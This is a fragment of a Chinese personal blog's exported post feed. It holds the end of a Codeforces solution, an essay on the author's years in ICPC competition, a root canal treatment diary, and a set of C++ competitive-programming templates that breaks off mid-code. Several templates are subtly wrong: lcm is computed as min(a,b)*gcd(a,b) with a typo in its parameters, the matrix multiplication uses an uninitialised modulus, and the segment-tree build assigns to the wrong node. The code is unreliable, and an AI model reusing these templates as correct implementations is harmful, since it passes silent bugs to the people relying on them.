punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> r <span class="token operator">>></span> c<span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">grid</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            cin <span class="token operator">>></span> grid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token function">solve</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> c<span class="token punctuation">,</span> grid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ans<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"MORTAL"</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> ans <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="E-Jeremy-Bearimy"><a href="#E-Jeremy-Bearimy" class="headerlink" title="E. Jeremy Bearimy"></a><a href="https://codeforces.com/contest/1281/problem/E">E. Jeremy Bearimy</a></h3><ul><li>题意：</li><li>题解&amp;代码：</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM经历</title>
      <link href="/2019/11/16/ACM%E7%BB%8F%E5%8E%86/"/>
      <url>/2019/11/16/ACM%E7%BB%8F%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span><br>我是在2017年入学的，入学一个月好像就有实验室来招新了，但是不是打ICPC的，是我们学校新思路Geek组，我运气还算可以，通过了笔试面试，最后一个面试，我选择了算法方向，然后当时有两条路，一条是搞AI，也就是现在蛮火的人工智能，另一条就是ICPC。我高中是有碰到过搞算法竞赛的人的，感觉他们各个都蛮强，于是我想试试他们的路，就选择了ICPC那个方向，面试的人说高中没搞过这个大学搞有点头铁，我当时好像是和他一起哈哈哈的笑起来，也许我就是头铁吧。</p><p>训练是很艰苦的，但也是蛮有趣的，我当时都组织不起队友来，一直都很迷茫。但是没有放弃，我还是一直在打。第一年从新思路挖了个人过来，打了2、3个月就退队了，之后的暑假和学长一起训练，老师找了个数统院的人过来一起组队，过了暑假人就没了。最后我是和学长一起去参加比赛的，学长那个队伍有个人有事，就没有去参加那次比赛，然后我刚好做了个替补。运气很好，最后1h的时候我突发奇想做出了一道计算几何的题，拿到了一块铜牌。我当时很开心，真的蛮开心的，我之前去的一场比赛打铁了（ICPC没拿奖我们都戏称为打铁），这场比赛就拿铜了。后面的事就变的奇怪起来了，学长退役了，他们那边留下来的一个队友和我们组队，我正准备好好的参加暑假的多校联合训练，我的另一个队友决定不打比赛了。而且还是在差不多放暑假的时候，我当时其实是有点生气的，现在也释怀了，毕竟别人的人生，需要由自己来安排。参加多校很难受，也有心里准备，毕竟和清北上交这类学校一起训练，还有一些国内知名强校，杭电广工等，别人做出7、8题，我们只能做出1、2题，差距一直是有的，只不过我选择性忽视了这种差距，可能是我不想承认这种差距吧。</p><p>现在，一切尘埃落定，4铁退役，我感觉我对于ACM的投入太少了。</p><p>虽然不打ACM了，但是我应该还会偶尔打打CF，体验好，也不用感到很难过。</p><p>我多多少少受到了我们实验室学长的影响，学长说，要知道自己现在在干什么，干的目的是什么，不能浑浑噩噩的，不然什么事情都做不成，之后毕业了会很麻烦。这句话现在还在影响我，我觉得这个就是一个做人的态度。每个人都需要知道我现在，当下所干的事都是为后来的事服务的。你需要有一个目的，要不娱乐，要不学习新知识。这对于之后的学习、生活会有很大的帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 算法竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>牙齿治疗日记</title>
      <link href="/2019/11/16/%E7%89%99%E9%BD%BF%E6%B2%BB%E7%96%97%E6%97%A5%E8%AE%B0/"/>
      <url>/2019/11/16/%E7%89%99%E9%BD%BF%E6%B2%BB%E7%96%97%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>&emsp;<br><span id="more"></span></p><h2 id="1-初次问诊"><a href="#1-初次问诊" class="headerlink" title="1. 初次问诊"></a>1. 初次问诊</h2><p>我是在高一的时候去看牙齿的，当时左边右边第一磨牙均是蛀牙。当时是我姐带我去绍兴市口腔医院做的。<br>医生当时先简单叩诊了我的牙齿，我左边第一磨牙有点疼，右边无感觉。我就决定先做左边的牙齿。打磨过后，我选择了2500+的烤瓷牙冠（后来经第二个医生矫正是嵌体）。我差不多去了两次吧，第一次除去蛀牙，第二次带上皇冠（指牙冠）手动滑稽。把左边的牙齿搞好之后，医生就开始了右边的牙齿的消除蛀牙。右边也选择了差不多的东西。后来我使用过程中，发现我左边牙齿一直疼，而且没有好转的迹象，我就去问医生该怎么办，医生说根管治疗，那就根管治疗吧。根管治疗过了4年之后，我的牙齿又开始疼起来了。</p><h2 id="2-再次就诊"><a href="#2-再次就诊" class="headerlink" title="2. 再次就诊"></a>2. 再次就诊</h2><p>这次我疼是有契机的，应该是炎症吧。我在疼之前2周左右，去厦门CCPC回来感冒发烧了，然后治了一半，就是吃药吃了一会儿我就感觉差不多，就停药继续开始浪了。之后口腔溃疡了，我也没怎么放在心上，口腔溃疡的第二天我的牙齿有点异样了，我没怎么注意，毕竟根管治疗神经都没了，怎么可能发生事情。后来越来越疼越来越疼。。。。我慌张的一匹，恰好这个时候南昌ICPC开始了，我就去打了，打比赛的时候全程演队友，唉这个也是一件伤心事，有时间之后写。我回来之后疼的受不了了，我就去校医院看了一下，校医院说你这个牙冠裂开了，我当时心里一震，完蛋。后来再次听到医保不给报，我心又凉了半截。刚拿到的奖学金没了，内心极其惆怅。校医院给我开了一盒阿莫西林，一盒甲硝锉，一盒罗比芬。我当时就在搜索哪个武汉哪个口腔比较好。发现武大口腔排名很前，就准备去挂号。看到网上挂号我惊了，这号根本不可能抢到啊。我问了一下我前队友，她说陆军总医院的医生水平还行，她母亲和奶奶都在那里做的根管，而且价格比较合理。我当时看武大口腔，去的人都说贵。而且我本人也挺喜欢军医的，就挂了那里的号，那我接下来，就来叙述一下我在陆军总医院的经历。</p><h3 id="2-1-根髓清理"><a href="#2-1-根髓清理" class="headerlink" title="2.1. 根髓清理"></a>2.1. 根髓清理</h3><p>时间：2019年11月13日</p><p>我进去医院看到的是两个小姐姐。当时我仔细和小姐姐说了一下病情，她说就先拍个片康康。然后另一个小姐姐就带我去拍X光片了。拍出来说我有两个根管忘记做了。。。。我当时心里一惊，心想完蛋。我问了一下我这个该怎么解决，她说要么清理出来再次根管治疗，要是中间要是断了就只能拔牙了。那我想着没办法了，也只能这么解决了。只能祈祷我根管不断了。上午做完之后，我感觉好多了，主治医生看我没有什么疼痛感觉了，就放我回来了。但是我一到寝室就疼，很疼很疼。于是我就立即和医生打电话说我好像不行了（手动滑稽），后来医生让我下午过去。下午小姐姐给我做了开放治疗，确实不疼了许多，至少能忍受了。接下来就是换药了，看治理情况了。</p><h3 id="2-2-跟随开放治疗"><a href="#2-2-跟随开放治疗" class="headerlink" title="2.2. 跟随开放治疗"></a>2.2. 跟随开放治疗</h3><p>时间：2019年11月17日</p><p>今天早上我去把我的药换了一下，我和医生大致说了一下我现在的情况：牙齿疼痛明显有好转，但是牙一侧的脸部肿了，然后有轻微肿痛。医生说我肿消了之后再封药，然后给我用小针戳了一下我的牙齿，我还是能感觉到酸痛感。医生给我再一次开放治疗，然后问了一下我是不是吃的药是甲硝锉+阿莫西林，我说是的，然后补充说止疼药停了。结束之后我们再次约了个时间：2019年11月22日。然后我就回学校了</p><h3 id="2-3-封药"><a href="#2-3-封药" class="headerlink" title="2.3. 封药"></a>2.3. 封药</h3><p>时间: 2019年11月24日</p><p>今天早上去做了一下封药。</p><h3 id="2-4-根管填充"><a href="#2-4-根管填充" class="headerlink" title="2.4. 根管填充"></a>2.4. 根管填充</h3><p>时间: 2019年12月8日</p><p>等了2个礼拜，终于把牙根最后填充完毕了。结束治疗。</p><h2 id="3-end……"><a href="#3-end……" class="headerlink" title="3. end……"></a>3. end……</h2>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>YGLtemplate</title>
      <link href="/2019/11/16/YGLtemplate/"/>
      <url>/2019/11/16/YGLtemplate/</url>
      
        <content type="html"><![CDATA[<h3 id="1-最大公约数-最小公倍数"><a href="#1-最大公约数-最小公倍数" class="headerlink" title="1. 最大公约数 最小公倍数"></a>1. 最大公约数 最小公倍数</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ll <span class="token function">gcd</span><span class="token punctuation">(</span>ll a<span class="token punctuation">,</span>ll b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> b<span class="token operator">==</span><span class="token number">0</span><span class="token operator">?</span>a<span class="token operator">:</span><span class="token function">gcd</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>a<span class="token operator">%</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ll <span class="token function">lcm</span><span class="token punctuation">(</span>lla <span class="token punctuation">,</span>ll b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">min</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2-筛法"><a href="#2-筛法" class="headerlink" title="2. 筛法"></a>2. 筛法</h3><h4 id="2-1线性素数筛"><a href="#2-1线性素数筛" class="headerlink" title="2.1线性素数筛"></a>2.1线性素数筛</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//count 为素数个数</span><span class="token keyword">class</span> <span class="token class-name">GetPrime</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> cnt<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> check<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> prime<span class="token punctuation">;</span>    <span class="token function">GetPrime</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">n</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">cnt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> prime<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">Go</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>check<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                prime<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>prime<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">*</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                check<span class="token punctuation">[</span>i <span class="token operator">*</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h4 id="2-2-莫比乌斯函数"><a href="#2-2-莫比乌斯函数" class="headerlink" title="2.2 莫比乌斯函数"></a>2.2 莫比乌斯函数</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//count 为素数个数</span><span class="token keyword">int</span> prime<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">bool</span> isprime<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> mu<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">getmu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">clr</span><span class="token punctuation">(</span>isprime<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    mu<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5000000</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> isprime<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>prime<span class="token punctuation">[</span><span class="token operator">++</span>count<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>             mu<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> count<span class="token punctuation">;</span> j<span class="token operator">++</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">*</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> maxn<span class="token operator">-</span><span class="token number">5</span> <span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            isprime<span class="token punctuation">[</span> i <span class="token operator">*</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">%</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>                mu<span class="token punctuation">[</span>i <span class="token operator">*</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>mu<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>                mu<span class="token punctuation">[</span>i <span class="token operator">*</span> prime<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="3-欧拉函数"><a href="#3-欧拉函数" class="headerlink" title="3. 欧拉函数"></a>3. 欧拉函数</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">1e6</span> <span class="token operator">+</span> <span class="token number">1000</span><span class="token punctuation">;</span><span class="token keyword">bool</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> phi<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> prim<span class="token punctuation">[</span>maxn<span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>cnt<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">gephi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    phi<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>maxn<span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            phi<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            prim<span class="token punctuation">[</span><span class="token operator">++</span>cnt<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>cnt<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> tp <span class="token operator">=</span> prim<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">*</span>tp<span class="token operator">></span>maxn<span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            vis<span class="token punctuation">[</span>i<span class="token operator">*</span>tp<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span>tp<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                phi<span class="token punctuation">[</span>i<span class="token operator">*</span>tp<span class="token punctuation">]</span><span class="token operator">=</span>phi<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>tp<span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> phi<span class="token punctuation">[</span>i<span class="token operator">*</span>tp<span class="token punctuation">]</span><span class="token operator">=</span>phi<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">*</span>phi<span class="token punctuation">[</span>tp<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="4-矩阵快速幂"><a href="#4-矩阵快速幂" class="headerlink" title="4. 矩阵快速幂"></a>4. 矩阵快速幂</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//首先定义一下矩阵类型</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">matrixnod</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> m<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> matrix<span class="token punctuation">;</span><span class="token comment">//3*3的矩阵乘法</span>matrix <span class="token function">mat</span><span class="token punctuation">(</span>matrix a<span class="token punctuation">,</span>matrix b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    matrix c<span class="token punctuation">;</span>    <span class="token keyword">int</span> mod<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        c<span class="token punctuation">.</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span> c<span class="token punctuation">.</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">*</span>b<span class="token punctuation">.</span>m<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>mod<span class="token punctuation">;</span>        c<span class="token punctuation">.</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">%=</span>mod<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> c<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//矩阵快速幂 b^n</span>matrix <span class="token function">doexpmat</span><span class="token punctuation">(</span>matrix b<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    matrix a<span class="token operator">=</span> <span class="token comment">//单位矩阵</span>    <span class="token punctuation">&#123;</span>        <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span> a<span class="token operator">=</span><span class="token function">mat</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        n<span class="token operator">=</span>n<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">;</span>        b<span class="token operator">=</span><span class="token function">mat</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="5-线段树"><a href="#5-线段树" class="headerlink" title="5. 线段树"></a>5. 线段树</h3><h4 id="5-1-单点更新，区间查询"><a href="#5-1-单点更新，区间查询" class="headerlink" title="5.1 单点更新，区间查询"></a>5.1 单点更新，区间查询</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Tree</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> l<span class="token punctuation">,</span> r<span class="token punctuation">;</span>    <span class="token keyword">int</span> sum<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">getmid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> node<span class="token punctuation">[</span>maxn <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">,</span><span class="token keyword">int</span> l<span class="token punctuation">,</span><span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">=</span> l<span class="token punctuation">,</span> node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>sum <span class="token operator">=</span> a<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">build</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>sum <span class="token operator">=</span> node<span class="token punctuation">[</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sum <span class="token operator">+</span> node<span class="token punctuation">[</span><span class="token punctuation">(</span>rt 